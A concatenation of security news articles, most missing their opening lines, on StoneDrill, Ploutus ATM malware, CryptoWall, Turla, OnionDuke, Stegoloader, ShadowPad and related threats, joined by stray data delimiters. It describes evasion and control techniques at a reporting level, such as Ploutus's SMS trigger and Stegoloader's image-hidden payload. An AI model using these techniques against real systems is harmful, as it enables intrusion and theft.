Dubbed “StoneDrill,” the malware has been linked to the notorious Shamoon 2 and Charming Kitten, aka Newscaster and NewsBeef, a threat actor believed to be located in Iran. The security firm has observed the threat being used in attacks aimed at entities in Saudi Arabia and one organization in Europe. Unlike in the case of Shamoon, which is known to have caused significant damage to oil giant Saudi Aramco, there are no reports of damaging attacks involving StoneDrill. Kaspersky Lab discovered StoneDrill using Yara rules created in an effort to identify unknown samples of Shamoon, aka Disttrack. Shamoon and StoneDrill don’t have the same codebase, but researchers said their authors’ programming style and mindset are similar. While it’s unclear exactly how StoneDrill has been delivered to victims, once it infects a machine, the malware injects itself into the web browser process and uses sophisticated techniques designed for evading security products. The threat targets both physical and logical drives, and reboots the system once the wipe process is completed. Researchers pointed out that the wiper functionality in StoneDrill has been implemented using a new technique. Kaspersky has also identified a StoneDrill sample designed to act as a backdoor, likely for espionage operations. Researchers have identified four command and control (C&C) servers used for spying on an unknown number of targets. While there are similarities between StoneDrill and Shamoon, such as the October-November 2016 sample compilation dates and the fact that both store their payload inside encrypted resources, there are some significant differences. For instance, Shamoon doesn’t use advanced evasion techniques, it doesn’t rely on external scripts, and it leverages drivers instead of memory injections. Furthermore, StoneDrill uses C&C communications, which allows the attackers to interact with the malware instead of having to use a “kill time” as in the Shamoon attacks. On the other hand, Kaspersky said StoneDrill seems more similar to a piece of malware used in APT campaigns attributed to Charming Kitten. Researchers discovered similarities in code, C&C naming conventions, backdoor commands and functionality, and Winmain signatures. In fact, StoneDrill appears to be an evolution of Charming Kitten malware.  While it is possible that StoneDrill is just another wiper used by the Shamoon actor, a more likely scenario, according to Kaspersky, is that these are separate groups with largely the same objectives. “When it comes to artefacts we can say that while Shamoon embeds Arabic-Yemen resource language sections, StoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would probably be quick to point out that both Iran and Yemen are players in the Iran-Saudi Arabia proxy conflict, and Saudi Arabia is the country where most victims of these operations were found,” explained Kaspersky’s Mohamad Amin Hasbini. “But of course, we do not exclude the possibility of these artefacts being false flags.” Shamoon, which had been delivered to victims via weaponized documents, has been linked to several groups believed to be operating out of Iran. Symantec reported recently that the threat actor behind the Shamoon attacks may have been aided by the groups tracked as Magic Hound (aka Timberworm and COBALT GYPSY) and Greenbug. These groups have been connected to both Charming Kitten and Rocket Kitten. " }

The security firm says Flashpack uses free ads to distribute the threats. Researchers have been monitoring multiple URLs utilized by the exploit kit as landing pages and determined that they have been accessed mostly by users in North America. One of the pieces of malware distributed by cybercriminals via the malicious advertising (malvertising) campaign is TROJ_DOFOIL, for which the number of infections peaked in October. According to Trend Micro, 41% of compromised devices are located in the Asia Pacific region, 27% in North America, and 17% in the Europe, Middle East and Africa (EMEA) region. When users access a website that serves malicious ads, they are taken via multiple redirects to a Flashpack exploit kit landing page, which is set up to serve a variant of the Dofoil Trojan (TROJ_DOFOIL.WYTU). The Cryptowall ransomware, which encrypts files found on infected computers and keeps them that way until a ransom is paid, is distributed via SWF files containing exploit code for a Flash Player vulnerability (CVE-2014-0515) which Adobe patched in April following reports that it had been exploited in watering hole attacks. Trend Micro explains that the distribution of threats such as Defoil and Cryptowall via malvertising poses a serious risk if we consider the combination of this attack technique with free applications that display ads. \"Ad-enabled free applications pose a serious threat to users and enterprises as attackers leverage this to distribute threats like Ransomware and DOFOIL. As such, this may lead to system infection and possible information and data theft. End-users are recommended to be cautious with the applications that they install. Similarly, in enterprise setting, employees should  be educated on what kind of application can be installed on their desktops.  If possible, create IT policies (like Acceptable Usage Policies) that could be drafted by their internal governing bodies, such as their InfoSec department,\" Trend Micro researchers said in a blog post. \"Aside from this, the combination of ensuring that third party applications like Flash and Java that loaded is by Web browsers is something to note for end-user to enterprise users alike. If possible, use security software with web filtering functionalities that has the capability to block malware-related and ad-related sites,\" they added. A similar campaign affecting several high-profile websites, including Yahoo and Match.com, was analyzed last month by researchers at Proofpoint. A report published recently by researchers from Ruhr-University Bochum, University College London and the University of California, Santa Barbara (UCSB) shows that 1% of online ads are malicious. " }

The malware, known as Ploutus, first surfaced last year in Mexico. At the time, the malware enabled attackers armed with an external keyboard to make illegal withdrawals from ATM machines. In the ensuing weeks however, a new variant appeared with an evolved architecture. \"The criminals can remotely control the ATM by using a mobile phone which is connected to the inside of the ATM,\" Regalado explained. \"There are multiple ways to connect a mobile phone to an ATM. A common method is to use a setup called USB tethering, which is effectively a shared Internet connection between a phone and a computer (or in this case, an ATM).\" \"The attackers need to set the phone up correctly, connect it to the ATM and infect the ATM with Ploutus,\" he added. \"Once all of these steps are complete, a full two-way connectivity is established and the phone is ready to be used.  Since the phone is connected to the ATM through the USB port, the phone also draws power from the connection, which charges the phone battery. As a result, the phone will remain powered up indefinitely.\" Once the mobile phone is connected to the ATM, the criminals can send specific SMS command messages to the phone attached inside the ATM. When the phone detects a new message under the required format, the phone will convert the message into a network packet and forward it to the ATM through the USB cable, the researcher wrote. \"The network packet monitor (NPM) is a module of the malware which acts as a packet sniffer, watching all network traffic going on in the ATM,\" he blogged. \"As soon as the compromised ATM receives a valid TCP or UDP packet from the phone, the NPM will parse the packet and search for the number “5449610000583686” at a specific offset within the packet in order to process the whole package of data. Once that specific number is detected, the NPM will read the next 16 digits and use them to construct a command line to run Ploutus.\" Banks looking to stop these cyber-heists have a number of options, including locking down the BIOS to prevent booting from unauthorized media such as CD ROMs or USB sticks and upgrading to newer versions of Windows. \"While the ATM’s money is locked inside a safe, the computer generally is not,\" Regalado blogged. \"Without adequate physical security for these older ATMs, the attacker has the upper hand.\" " }

According to the FBI's Internet Crime Complaint Center (IC3), more than 992 CryptoWall-related complaints were received between April 2014 and June 2015. During that period, victims reported more than $18 million in losses. \"The financial impact to victims goes beyond the ransom fee itself, which is typically between $200 and $10,000,\" according to the advisory from IC3. \"Many victims incur additional costs associated with network mitigation, network countermeasures, loss of productivity, legal fees, IT services, and/or the purchase of credit monitoring services for employees or customers.\" \"The problem begins when the victim clicks on an infected advertisement, email, or attachment, or visits an infected website,\" the advisory notes. 'Once the victim’s device is infected with the ransomware variant, the victim’s files become encrypted. In most cases, once the victim pays a ransom fee, he or she regains access to the files that were encrypted. Most criminals involved in ransomware schemes demand payment in Bitcoin. Criminals prefer Bitcoin because it's easy to use, fast, publicly available, decentralized, and provides a sense of heightened security/anonymity.\" In March, stats from Trend Micro revealed that New Zealand and Australia were home to the most CryptoWall 3.0 infections, with 50.38 percent. North America and Europe were next with 24.18 and 14.27 percent, respectively. CryptoWall, and ransomware in general, is effective because many people are failing in three areas: keeping their software up-to-date; performing nightly backups of workstations and file servers; and maintaining up-to-date anti-malware software, Kaspersky Lab's Kurt Baumgartner told SecurityWeek. \"The second one is particularly helpful because ransomware will seek out mapped drives and encrypt files on servers,\" said Baumgartner, principal security researcher at Kaspersky Lab. \"I have seen this bad fortune in Colorado at non-profits and small businesses. One employee tries running a cracked software installer that includes embedded ransomware code, and it ends up encrypting the files on a mapped drive the organization considered their “backup.” You can’t recover from that without paying the price – ransomware crypto routines have improved to the point where you can’t just find a side-channel attack to recover files.\" " }

Hutchins became famous and was named a “hero” after he helped stop the WannaCry ransomware attack by registering a domain that acted as a kill switch for the malware. The researcher was arrested in early August in the United States as he had been preparing to return to the U.K. and was charged for his alleged role in creating and selling Kronos. He has pleaded not guilty to the charges brought against him and released on bail during his trial. He cannot leave the U.S. and will be tracked via GPS, but authorities have allowed him to access the Internet – except for the domain used to stop the WannaCry outbreak. The only information provided so far by authorities regarding the case they have against Hutchins is that he and an unnamed partner allegedly created and sold the Kronos malware in 2014 and 2015. While it’s unclear what evidence these accusations are based on, some believe it may have something to do with a tweet posted by MalwareTech in February 2015, when he claimed a hooking engine he made had been abused by malware developers. A researcher known online as “Hasherezade” has published a detailed analysis of Kronos, a piece of malware that has been around since 2014, on the Malwarebytes blog. The expert pointed out that the code used by Kronos authors to implement hooking, a technique for modifying the behavior of an application by intercepting function calls or messages passed between different components, is similar to one published by MalwareTech on his GitHub account. However, as a Greece-based experts noted, the hooking technique found in both Kronos and MalwareTech’s GitHub account was first described in 2009. MalwareTech is not allowed to discuss his case with anyone, but he pointed out on Twitter that none of the code found on his GitHub account implements new techniques and instead represents proof-of-concept (PoC) code for existing methods. It’s unclear at this point if investigators used these similarities to link Hutchins to Kronos and if the code that the researcher claimed was stolen from him in 2015 was used in this banking Trojan or different malware. According to Hasherezade, an analysis of the Kronos code suggests that its author is a skilled malware developer. “The code is well obfuscated, and also uses various tricks that requires understanding of some low-level workings of the operating system. The author not only used interesting tricks, but also connected them together in a logical and fitting way. The level of precision lead us to the hypothesis, that Kronos is the work of a mature developer, rather than an experimenting youngster,” Hasherezade said. While many have named Hutchins a hero for his role in stopping the WannaCry outbreak, some, including Immunity founder Dave Aitel, believe he may have actually been involved in the WannaCry attack. Legal aspects of the case In the meantime, some media reports claim Britain’s GCHQ spy agency knew that the FBI had been investigating Hutchins before he travelled to the United States. People familiar with the matter told The Sunday Times that the expert’s arrest in the U.S. freed the British government from the “headache of an extradition battle.” While Hutchins awaits trial, some legal experts have called into question the constitutionality of the indictment. “Since Hutchins’ indictment, commentators have questioned whether the creation and selling of malware—without actually using the malware—violates the two statutes under which Hutchins was charged: the Computer Fraud and Abuse Act and the Wiretap Act. It is likely that these issues will be litigated as the case unfolds,” said Alex Berengaut, a lawyer with Covington & Burling. “But there is another question raised by the indictment: whether it violates Hutchins’ constitutional rights to charge him for his alleged conduct under any statute in this country,” Berengaut added. “Several circuits—including the Seventh Circuit, where Hutchins’ case will be heard—have recognized that the federal government cannot charge anyone, anywhere in the world irrespective of their connections to the United States.” " }

In research recently presented at the 2014 Internet Measurement Conference in Vancouver, a team of security experts from Ruhr-University Bochum, University College London and the University of California, Santa Barbara (UCSB) examined more than 600,000 online advertisements on 40,000 websites over a three-month period and used multiple detection systems to assess whether they were good or bad. The end result: one percent of the ads were found to be involved in suspicious or malicious activity such as drive-by downloads and link hijacking. \"While this is bad news for the advertising networks, advertisers and Internet users who are all under attack from the malware producers, the good news is there are several things available today that can stop malvertising,\" said Giovanni Vigna, co-founder and CTO of Lastline, one of the members of the team that worked on the research. \"One of these is the use of the sandboxing attribute in iframes within HTML5. None of the 40,000 websites we observed leveraged this mechanism, even though it could stop the link-hijacking that is by far the most prevalent method by which miscreants are getting past other security measures in order to distribute malware through advertisements.\" \"On the ad network side -- whether those be ad brokers, ad distributors, ad resellers or traditional ad networks -- a similar approach can be taken to that used in our study to monitor for malvertising,\" he continued. \"To detect malicious behavior in ads we used a composition of blacklists, reputation databases, and Wepawet, a honeyclient developed at UCSB that uses an emulated browser to capture the execution of JavaScript to identify signs of maliciousness, such as drive-by-download attacks. The research community and technology companies (including security providers as well as ad networks and ad brokers) can and should continue to study malvertising and develop new techniques and tools to detect and stop it.\" Apostolis Zarras of Ruhr-University Bochum said that the smaller ad networks appear to be more prone to serving malvertisements, which he speculated could be due to less efficient filtering mechanisms compared to the larger ones.  In the paper, the researchers also speculated that many publishers trust their advertisers to police malicious activity, and therefore do not use additional filters to protect their users. As for solutions, the researchers argued that collaboration among the ad networks can bring better results in defending against malvertisements compared to individual actions, and the existence of a common blacklist where all malicious advertisements will be submitted can prevent attackers from submitting their wares to a different network if they get rejected by another.   \"Another, more drastic, solution will be penalizing of the ad networks which are inefficient to detect the malicious code embedded in advertisements,\" according to the paper. \"For instance, forbidding from participating in ad arbitrations for a certain amount of time, or the application of similar penalties, when an ad network is found delivering malvertisements, can boost the ad networks to invest in better detection algorithms.\" \"Back in time, said Zarras, \"we used to have websites that were controlled by cyber-criminals and the attackers had to lure the victims to visit these websites so they can effectively infect their machines with malware. But, with the ads this is not necessary any more. An ad can exploit vulnerabilities in your browser, or your browser extensions without the need from user’s side to visit a malicious website. For instance, the incident that took place on January 2014, in which Yahoo ads exploited vulnerabilities in Java and installed malware on victims' computers, [shows] that these attacks are actually possible and not theoretical. So, the main reason that malvertisement is more effective that traditional attacks, is that the user’s can be infected with malware even if they visit only legitimate websites.\" " }

According to the report, the spy agencies have worked to undermine security software from a number of companies by reverse-engineering products and monitoring Web and email traffic. A warrant renewal request issued by the GCHQ in 2008 published by The Intercept states that \"personal security products such as the Russian anti-virus software Kaspersky continue to pose a challenge to GCHQ’s CNE capability and SRE is essential in order to be able to exploit such software and to prevent detection of our activities.\" The NSA also reportedly targeted Kaspersky Lab as well. In 2008, a draft of a top-secret NSA report states that Kaspersky Lab software was sending sensitive user data back to the company's servers that could be intercepted and used to track users because Kaspersky user-agent strings contained encoded versions of product serial numbers. In a statement to The Intercept, Kaspersky Lab denied the user-agent strings could be leveraged to track customers. The Intercept also cited a 2010 presentation on \"Project Camberdada,\" which appears to suggest that spy agencies may be monitoring emails of employees at cyber-security firms. Roughly two dozen companies were mentioned in the presentation on a slide entitled 'More Targets!', including Kaspersky Lab as well as AVG Technologies, ESET and F-Secure. Other prominent security vendors - such as Symantec, McAfee (now Intel Security) and Sophos - were not mentioned. “While I doubt very much it will come to this, it would be very interesting to hear the ostensibly pro-business governments of both the US and UK have to answer the question about what effects breaking security companies’ products may have on the companies’ ability to make money from providing security in the first place,\" said Jonathan Sander, strategy and research officer at STEALTHbits Technologies. \"If the government can break them, what stops anyone else?” Recently, Kaspersky Lab discovered it had been targeted with Duqu 2.0, an updated version of the malware platform. Some reports have linked the attack to Israel. \"Spying on cybersecurity companies is a very dangerous tendency,\" Eugene Kaspersky, CEO of Kaspersky Lab, said in a statement at the time. \"Security software is the last frontier of protection for businesses and customers in the modern world, where hardware and network equipment can be compromised. Moreover, sooner or later technologies implemented in similar targeted attacks will be examined and utilized by terrorists and professional cybercriminals. And that is an extremely serious and possible scenario.\" " }

According to Barracuda Networks, Threatglass permits users to graphically browse website infections cataloged by Barracuda's system by viewing screenshots of the stages of infection, as well as by analyzing network characteristics such as host relationships and packet captures. \"Good sites gone bad is a daily problem for popular websites targeted by attackers and used to serve malware to their unsuspecting visitors,\" said Dr. Paul Judge, chief research officer and vice president at Barracuda, in a statement. \"Threatglass was designed for both casual users and the research community to provide a way to document and better understand this ongoing problem.\" According to the company, Threatglass is the frontend of a system that utilizes thousands of virtual machines to visit URLs in web browsers to see what happens to the browsers, their plugins and the operating systems. Without prior knowledge of specific exploits served to the browser or its extensions, the resulting network-level actions are recorded and analyzed to reveal whether the URLs serve malicious content, according to the company.  Websites for inspection are sourced from multiple data feeds including the Alexa Top 25,000 sites, social feeds and suspicious websites from Barracuda's customer network. In addition to screen captures of the infections, Threatglass displays different representations of network traffic, including DNS, HTTP and Netflow in graphical and textual formats. The system has cataloged approximately 10,000 live web-based malware attacks and adds new ones every day. The visualization features also allow users to view charting and trending data of historical volumes and examine the relationships between different components of an attacker ring. Users can also submit websites for inspection and analysis. Barracuda Labs’ malware detection engines have discovered numerous high-profile infections in the last few months and have published findings on Cracked.com, Php.net and Hasbro.com. Those examples and thousands of other infected websites now are visible through Threatglass, according to the company.   " }

The group has been active since at least mid-2013, but its activities were first detailed in April 2015 by LookingGlass. The security firm’s analysis focused on Operation Armageddon, a cyber espionage campaign targeting Ukrainian government, military and law enforcement officials. The Security Service of Ukraine (SBU) issued a statement at the time attributing the attacks to branches of Russia's Federal Security Service (FSB). Furthermore, evidence found by researchers suggested that the malware used by the threat actor had been built on a Russian operating system. In the attacks analyzed by LookingGlass in 2015, the Gamaredon group used spear-phishing emails to deliver common remote access tools (RATs), such as Remote Manipulator System (RMS) and UltraVNC. According to Palo Alto Networks, Gamaredon has started using new, custom-built malware instead of the widely available RATs. However, it’s unclear if the latest attacks are also part of Operation Armageddon or if they represent a new campaign. The new pieces of malware used by the group are capable of downloading and executing additional payloads, scanning infected systems for specific files, capturing screenshots, and executing remote commands. While the actor’s older tools were easily identified by antimalware products (e.g. TROJ_GAMAREDON, Trojan.Gamaredon), its new creations often go undetected or unrecognized. “We believe this is likely due to the modular nature of the malware, the malware’s heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes,” said Palo Alto Networks researchers. One of the custom backdoors used by Gamaredon is Pteranodon, which can capture screenshots, download and execute files, and execute commands on the system. While Gamaredon has started using new malware, it still relies on self-extracting archives (SFX) and much of the same infrastructure as when its activities were first analyzed. Russia-linked threat groups have been blamed for several campaigns targeting Ukrainian organizations, including damaging attacks on the country’s energy sector. " }

The new sandbox, named VirusTotal Droidy, is designed to replace a system introduced back in 2013. Droidy can help researchers obtain information on network communications and SMS-related activities, file system interactions, SQLite database usage, permissions, Java reflection calls, process and service actions, registered receivers, and crypto-related activity. Information from the Droidy sandbox is available in the Behavior section, and it can be selected from the dropdown menu that also includes the Tencent HABO analysis system. VirusTotal noted that the data from Droidy complements Tencent HABO - they are both part of a multisandbox project that aims to aggregate malware analysis sandbox reports. Selecting Droidy from the behavior menu displays some general information about the analyzed file (example), but users can also obtain a detailed report that allows them to “dig into the hooked calls and take a look at the screenshots generated when running the apps.”  Droidy integrates with other services, such as VirusTotal Graph and VirusTotal Intelligence. VirusTotal says its goal is to generate as much information as possible in order to help investigators get a better understanding of a particular threat. “Very often during an investigation, you might not have enough context about an individual threat, and so being able to look at the connected URLs, domains, files, IP addresses, etc. becomes crucial in understanding what is going on,” explained VirusTotal’s Emiliano Martinez. VirusTotal also announced recently that it has made several improvements to the MacOS sandbox. " }

G20 is an international forum for governments and central banks from all continents. The G20 Summit was held last month in Hamburg, Germany, and other events are scheduled to take place in the same city later this year, including the Task Force “Digital Economy” meeting in October 23 - 24. A document announcing the Digital Economy meeting has apparently been used by Turla as a decoy to deliver a new .NET/MSIL dropper, which deploys a recently discovered JavaScript backdoor tracked as KopiLuwak. The decoy document appears to come from Germany’s Federal Ministry for Economic Affairs and Energy, and researchers believe the file is likely legitimate. The document does not appear to be publicly available, which indicates that it may have been obtained by the attackers from an entity that received the file. Proofpoint highlighted that the decoy document’s metadata shares similarities to a legitimate PDF file hosted on the website of the Federal Ministry for Economic Affairs and Energy, including the author’s name (BE.D4.113.1) and the device it was created with (KONICA MINOLTA bizhub C284e). The new dropper delivered alongside this document is stored in a file named Scr.js, which creates a scheduled task for persistence and executes various commands to obtain information about the infected device. The dropper looks for the presence of Kaspersky security products before dropping the KopiLuwak backdoor, which is not surprising considering that Kaspersky Lab was the first to analyze KopiLuwak. Researchers pointed out that the dropper code is not obfuscated and it does not include any anti-analysis mechanisms. In older versions of KopiLuwak, the backdoor itself was in charge of fingerprinting the system, but the functionality has now been moved to the dropper. Since Proofpoint’s analysis is based on files obtained from a public malware repository, it’s unclear who was targeted in this attack. However, based on the theme of the decoy document, the most likely targets are individuals and organizations interested in the G20 event. This can include member countries, policy makers and journalists. Turla has been active since at least 2007 and is believed to be responsible for several high-profile attacks, including the ones aimed at Swiss defense firm RUAG and the U.S. Central Command. The group is also known as Waterbug, KRYPTON and Venomous Bear, and some of its primary tools are tracked as Turla (Snake and Uroburos) and Epic Turla (Wipbot and Tavdig). This spring, Turla and another Russia-linked threat group, known as APT28 and Fancy Bear, had been spotted exploiting zero-day vulnerabilities in Microsoft products. " }

Last month, a researcher with the Leviathan Security Group revealed that a Russia-based Tor exit node had been patching files downloaded through it with malware. By wrapping legitimate executable files with malware, the attackers increased their chances of bypassing integrity check mechanisms. After analyzing files served through this exit node, F-Secure researchers determined that they all contained the same piece of malware, which the security firm has dubbed \"OnionDuke.\" OnionDuke is a malware family that had been distributed via the Tor network since at least October 2013. According to experts, since at least February 2014, the threat actors have also distributed the threat through malicious versions of pirated software hosted on torrent websites.  However, F-Secure believes the OnionDuke family is much older since they have found evidence to suggest that the samples they have analyzed are actually version 4 of the malware. Researchers haven't yet identified any of the older versions, but the timestamps on the oldest OnionDuke binaries they have analyzed were from July 5 and July 15, 2013, F-Secure told SecurityWeek. OnionDuke is a separate family from MiniDuke, a sophisticated malware family with Russian roots that has been seen in advanced persistent threat (APT) campaigns against government organizations. However, researchers have found that the two threats are connected through their command and control (C&C) infrastructure. More precisely, some of the C&C domains used by both MiniDuke and OnionDuke were registered at around the same time by an individual using the alias (John Kasai). In the attacks monitored by F-Secure, the cybercriminals used the malicious Tor exit node to distribute the OnionDuke dropper, detected as Trojan-Dropper:W32/OnionDuke.A. The dropper contains a PE resource that appears to be an embedded GIF image file, but in reality it's a DLL file that's decrypted, written to the disk, and executed. The DLL file, detected as Backdoor:W32/OnionDuke.B, decrypts the embedded configuration file and attempts to connect to the hardcoded C&C domains specified in it. \"From these C&Cs the malware may receive instructions to download and execute additional malicious components. It should be noted, that we believe all five domains contacted by the malware are innocent websites compromised by the malware operators, not dedicated malicious servers,\" F-Secure's Artturi Lehtiö wrote in a blog post. Another component identified by researchers is detected as Backdoor:W32/OnionDuke.A. This threat contains different hardcoded C&C domains and it's actually the sample that allowed F-Secure to make the connection to MiniDuke. Experts also believe this variant might be abusing Twitter as an additional C&C channel. According to F-Secure, OnionDuke has been used in targeted attacks aimed at government agencies in Europe. However, experts haven't been able to determine the distribution vector utilized in these attacks. F-Secure told SecurityWeek that the attacks didn't target countries in Western Europe. One of the targets is in Central Europe, within Russia's sphere of concern, researchers said. \"Interestingly, this would suggest two very different targeting strategies. On one hand is the 'shooting a fly with a cannon' mass-infection strategy through modified binaries and, on the other, the more surgical targeting traditionally associated with APT operations,\" Lehtiö said. The malware authors have not given up on MiniDuke and they keep improving it. An updated version of the Trojan, dubbed CosmicDuke, was discovered by F-Secure this summer. " }

Stegoloader, detected as Win32/Gatak.DR by Microsoft and TSPY_GATAK.GTK by Trend Micro, has been around since at least late 2013. The malware’s modular design allows cybercriminals to carry out various tasks while making it difficult for researchers to analyze the threat. According to experts in the Dell SecureWorks Counter Threat Unit, Stegoloader attacks start with a deployment module that’s responsible for downloading and launching the malware’s main module on infected systems. Before downloading the main component, the deployment module checks for the presence of an analysis environment by monitoring mouse movements. If the mouse cursor doesn’t change its position, or if it changes its position constantly, the malicious application is terminated. The deployment module also lists running processes to see if popular analysis and security tools such as Wireshark, Fiddler, Sandboxie, InCtrl5, and OllyDBG are running. If a process associated with one of the targeted tools is detected, the malware is terminated. A method used by the malware authors to slow down static analysis involves the dynamic construction of strings in the binary. This makes detection and analysis more difficult compared to malware that stores strings inside its body in clear text. Once it ensures that it’s not being analyzed, the deployment module accesses a hardcoded URL to download a Portable Network Graphics (PNG) image file hosted on a legitimate website. This harmless-looking image file contains the main Stegoloader module. “After downloading the image, Stegoloader uses the gdiplus library to decompress the image, access each pixel, and extract the least significant bit from the color of each pixel. The extracted data stream is decrypted using the RC4 algorithm and a hard-coded key,” researchers explained in a blog post. Hiding malware in images is not unheard of. The technique, known as digital steganography, has also been used by threats such as the Lurk downloader and the Neverquest Trojan. Stegoloader is difficult to detect using traditional signature-based analysis because the PNG image and the decrypted code are not saved to the disk. The malware’s main module resides in a memory area specially allocated for this purpose. Once the main module steps into play, the deployment module is terminated. The malware then starts communicating with its command and control (C&C) server and waits for instructions from the cybercriminals. Communications between Stegoloader and its C&C server are encrypted, researchers noted. The operators can instruct the malware to collect information such as system details, a list of applications installed on the infected system, and browser history from Chrome, Firefox and Internet Explorer. Stegoloader can also be ordered to sleep, stop execution, and execute shellcode. If the information collected by the malware matches certain criteria, the cybercrooks can deploy additional modules that allow them to carry out various tasks. For example, they can install a module that enables them to steal Interactive Disassembler (IDA) instances, a module that lists recently opened documents, and one that determines the host’s geographic location. Stegoloader operators can also deploy a Pony module. This module, which uses the Pony Loader information-stealing malware, allows attackers to harvest passwords from various applications. In some cases, cybercriminals have been spotted installing Vundo malware (Ponmocup), which displays ads and installs additional threats, on systems infected with Stegoloader. Experts believe Vundo is utilized for additional monetary profit. According to Dell SecureWorks, Stegoloader has infected devices in healthcare, education, manufacturing and other sectors. Despite having highly efficient information-stealing capabilities, the malware has not been spotted by researchers in targeted attacks. " }

Researchers with F-Secure spotted a variant of the malware that includes code to read and write to Bitcoin wallets. It also hooks into the process by which the wallet is encrypted, stealing the password and thwarting encryption. This is just another twist for Gameover, which has emerged as one of the most treacherous pieces of financial malware on the Internet. Gameover first appeared on the Internet in 2011. Recently, researchers at Dell SecureWorks dubbed the malware the most prevalent banking Trojan of 2013, noting that it accounted for 38 percent of the company's detections of financial malware. According to research from Sophos, a recently detected variant of the malware used a kernel-level rootkit known as Necurs to protect malware files on disk and in memory and make it difficult to remove the Trojan. That particular variant was seen spreading via a spam campaign that used messages with fake invoices. \"Gameover is “privately” held by one gang – it’s a different fork from the ZeuS code which was open sourced years ago,\" explained Sean Sullivan, security advisor at F-Secure. \"The sample we’ve analyzed is relatively new,\" he said. \"But the botnet nodes themselves may have already begun to update.\" \"[ZeuS] isn’t always first to adopt a new tactic, but it is generally 'best of breed',\" he added. Certainly, bitcoin users and exchanges have been getting more attention from hackers lately. Earlier this month, bitcoin exchanges Poloniex and Flexcoin announced they had been hit by hackers. As a result of the attack, Flexcoin was forced to shut down. More malware targeting bitcoins has also been popping up, such as OSX/CoinThief.A, a Trojan targeting Mac users. \"I’m somewhat surprised at how long it’s taken to incorporate wallet.dat stealers into big players – but then I suppose that means that Bitcoin may now be a 'real' industry,\" Sullivan said. \"Not sure if that is a good thing for Bitcoin users in the long run.\" John Miller, security research manager at Trustwave, said that recent security events involving crypto-currencies serve as a reminder to users that criminals will hunt down financial assets regardless of their form. \"Individual users are at risk when they store their wallets insecurely or entrust their coins to third-party services,\" he said. \"Malware such as Pony can steal unencrypted wallets from unsuspecting users. Services can be scams intent on defrauding users or could suffer theft that results in financial loss to users. Safe browsing habits, anti-malware solutions, and gateway protection technologies can all help with the former, only proper consumer research can help with the latter.\" " }

A total of three Shamoon 2 attack waves were observed recently, including two in November 2016 and one on January 23. The attacks, believed by many to be the work of Iran, targeted organizations in the Persian Gulf, particularly Saudi Arabia. Experts have identified connections between apparently different threat groups and the Shamoon attacks. First, Symantec reported that an actor tracked by the company as Greenbug may have helped obtain credentials used in the Shamoon operation. Later, Palo Alto Networks published a report on Magic Hound, a campaign targeted at energy, government and technology sector organizations that are located or have an interest in Saudi Arabia. The operation involved domains and a RAT linked by IBM to Shamoon attacks. Researchers also found connections between the Magic Hound attacks and two other Iran-linked advanced persistent threat (APT) actors: Charming Kitten (Newscaster) and Rocket Kitten. Symantec tracks the group behind Magic Hound as Timberworm, and SecureWorks has named it COBALT GYPSY. Symantec said Timberworm apparently facilitated the January 2017 Shamoon attacks. The group, similar to Greenbug, gained access to the targeted organizations’ systems weeks or months before Shamoon was deployed in order to conduct reconnaissance, harvest credentials and establish persistent remote access. Timberworm used spear-phishing emails and weaponized documents to gain a foothold in each organization’s network. The attacker then leveraged custom malware, hacking tools and legitimate sysadmin applications to achieve its goals. The use of legitimate tools can help avoid detection and makes attribution more difficult. Both Greenbug and Timberworm penetrated the systems of many organizations – not only in Saudi Arabia – but the Shamoon worm was only deployed against specific targets. “Timberworm appears to be a much larger operation, infiltrating a much broader range of organizations beyond those affected by the recent Shamoon attacks. Similarly, Greenbug targeted a range of organizations in the Middle East beyond those affected by Shamoon, including companies in the aviation, energy, government, investment, and education sectors,” said Symantec researchers. “While both groups leveraged two distinct toolsets, their targets, tactics, and procedures align very well and in close proximity to the coordinated wiping events,” they added. The evidence suggests that the groups worked together and their activities may have been orchestrated by a single entity, experts said. " }

Originally developed by VirusTotal software engineer Victor Alvarez, YARA is a tool that allows researchers to analyze and detect malware by creating rules that describe threats based on textual or binary patterns. Kaspersky Lab has developed its own version of the YARA tool. Named KLara, the Python-based application relies on a distributed architecture to allow researchers to quickly scan large collections of malware samples. Looking for potential threats in the wild requires a significant amount of resources, which can be provided by cloud systems. Using a distributed architecture, KLara allows researchers to efficiently scan one or more YARA rules over large data collections – Kaspersky says it can scan 10Tb of files in roughly 30 minutes. “The project uses the dispatcher/worker model, with the usual architecture of one dispatcher and multiple workers. Worker and dispatcher agents are written in Python. Because the worker agents are written in Python, they can be deployed in any compatible ecosystem (Windows or UNIX). The same logic applies to the YARA scanner (used by KLara): it can be compiled on both platforms,” Kaspersky explained. KLara provides a web-based interface where users can submit jobs, check their status, and view results. Results can also be sent to a specified email address. The tool also provides an API that can be used to submit new jobs, get job results and details, and retrieve the matched MD5 hashes. Kaspersky Lab has relied on YARA in many of its investigations, but one of the most notable cases involved the 2015 Hacking Team breach. The security firm wrote a YARA rule based on information from the leaked Hacking Team files, and several months later it led to the discovery of a Silverlight zero-day vulnerability. The KLara source code is available on GitHub under a GNU General Public License v3.0. Kaspersky says it welcomes contributions to the project. This is not the first time Kaspersky has made available the source code of one of its internal tools. Last year, it released the source code of Bitscout, a compact and customizable tool designed for remote digital forensics operations. " }

NetSarang, which has offices in the United States and South Korea, specializes in secure connectivity solutions. Some of its most popular products are Xshell, Xmanager, Xftp and Xlpd. Kaspersky discovered a backdoor in these tools after one of its customers in the financial sector noticed suspicious DNS requests coming from a NetSarang software package. An investigation conducted by the vendor revealed that the latest versions of Xmanager Enterprise 5 (build 1232), Xmanager 5 (build 1045), Xshell 5 (build 1322), Xftp 5 (build 1218) and Xlpd 5 (build 1220) had been compromised. Security experts believe the attackers either modified source code or patched the software on NetSarang’s build servers after gaining access to the company’s systems. The affected builds were released on July 18 and the backdoor was only discovered on August 4. NetSarang’s products are used by hundreds of financial, software, media, energy, electronics, insurance, industrial, construction, manufacturing, retail, telecoms, pharmaceutical and transportation companies. However, Kaspersky has only seen the malicious payload being activated on the systems of a company in Hong Kong. Kaspersky says the malware could be lying dormant on the networks of other organizations, but NetSarang said it alerted the antivirus industry so security products may have already neutralized the malicious files. The malware, detected by Kaspersky as Backdoor.Win32.ShadowPad.a, communicates with its command and control (C&C) server via DNS queries sent once every eight hours. The requests contain information on the infected machine, including user name, domain name and host name. If the infected system is of interest to the attackers, they activate a fully fledged backdoor that they can use to download and execute other malware. “If the backdoor were activated, the attacker would be able to upload files, create processes, and store information in a VFS [virtual file system] contained within the victim’s registry. The VFS and any additional files created by the code are encrypted and stored 